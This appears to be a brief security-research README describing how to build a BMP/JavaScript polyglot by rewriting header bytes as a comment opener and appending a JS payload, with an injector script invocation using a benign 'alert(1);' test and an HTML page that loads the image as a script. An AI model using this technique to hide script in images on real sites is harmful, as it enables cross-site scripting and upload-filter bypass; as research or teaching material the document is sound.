# polyglot

## Step
1. Replace the 3rd, 4th bytes with \x2F\x2A, which means the comment /*
2. Add below contents at the tail of BMP binary:
    * \xFF
    * \x2A\x2F, which means the closure of comment, */
    * \x3D\x31\x3B, which means '=1', fake as BMP format
    * JS payload

## Python Script - BMPinjector.py
```
python BMPinjector.py tomcat.bmp "alert(1);"
``` 

## Test - run.html
```
<html>
<head><title>Opening an image</title></head>
<body>
<img src="1.bmp"\>
<script src="1.bmp"></script>
</body>
</html>
```